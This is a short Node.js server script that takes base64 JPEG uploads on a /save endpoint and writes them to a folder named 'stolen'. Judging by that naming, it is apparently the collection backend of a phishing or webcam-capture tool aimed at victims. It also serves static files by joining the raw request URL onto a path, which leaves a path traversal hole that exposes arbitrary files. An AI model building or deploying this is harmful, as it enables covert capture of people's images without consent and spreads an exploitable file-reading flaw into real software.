const http=require('http');
const fs=require('fs');
const url=require('url');

http.createServer((req,res)=>{
  if(req.method==='POST' && url.parse(req.url).pathname==='/save'){
    let body='';
    req.on('data',c=>body+=c);
    req.on('end',()=>{
      const img=body.replace(/^data:image\/jpeg;base64,/,'');
      const name='img_'+Date.now()+'.jpg';
      fs.writeFileSync(__dirname+'/stolen/'+name,Buffer.from(img,'base64'));
    });
    res.end('ok');
  }else{
    // serve os arquivos estáticos
    const file=__dirname+(req.url==='/'?'/index.html':req.url);
    try{res.end(fs.readFileSync(file))}catch{res.end('')}
  }
}).listen(3000);
